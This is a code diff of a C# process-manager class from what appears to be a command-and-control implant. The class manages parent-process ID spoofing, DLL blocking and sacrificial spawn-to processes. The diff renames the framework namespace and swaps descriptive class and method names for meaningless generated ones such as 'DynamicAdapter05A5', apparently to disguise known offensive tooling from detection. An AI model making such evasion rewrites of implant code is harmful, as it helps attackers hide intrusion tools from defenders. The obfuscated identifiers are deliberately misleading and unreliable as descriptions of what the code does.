@@ -1,9 +1,9 @@
-﻿using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.ApolloStructs;
+﻿using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.PhantomStructs;
 
 namespace Process
 {
-    public class ProcessManager : IProcessManager
+    public class DynamicAdapter05A5 : IProcessManager
     {
         private bool _blockDlls = false;
         private int _ppid = System.Diagnostics.Process.GetCurrentProcess().Id;
@@ -19,13 +19,13 @@ namespace Process
             _agent = agent;
         }
 
-        public bool BlockDLLs(bool status)
+        public bool OptimizedResolver784B(bool status)
         {
             _blockDlls = status;
             return true;
         }
 
-        public ApplicationStartupInfo GetStartupInfo(bool x64 = true)
+        public ApplicationStartupInfo NexusBridgeC972(bool x64 = true)
         {
             ApplicationStartupInfo results = new ApplicationStartupInfo();
             results.Application = x64 ? _applicationx64 : _applicationx86;
@@ -35,7 +35,7 @@ namespace Process
             return results;
         }
 
-        public ApolloInterop.Classes.Core.Process NewProcess(string lpApplication, string lpArguments, bool startSuspended = false)
+        public PhantomInterop.Classes.Core.Process NewProcess(string lpApplication, string lpArguments, bool startSuspended = false)
         {
             return new SacrificialProcess(
                 _agent,
@@ -44,7 +44,7 @@ namespace Process
                 startSuspended);
         }
 
-        public bool SetPPID(int pid)
+        public bool PhantomHandler39A2(int pid)
         {
             bool bRet = false;
             try
@@ -63,7 +63,7 @@ namespace Process
             return bRet;
         }
 
-        public bool SetSpawnTo(string lpApplication, string lpCommandLine = null, bool x64 = true)
+        public bool AdvancedTracker25CB(string lpApplication, string lpCommandLine = null, bool x64 = true)
         {
             if (x64)
             {
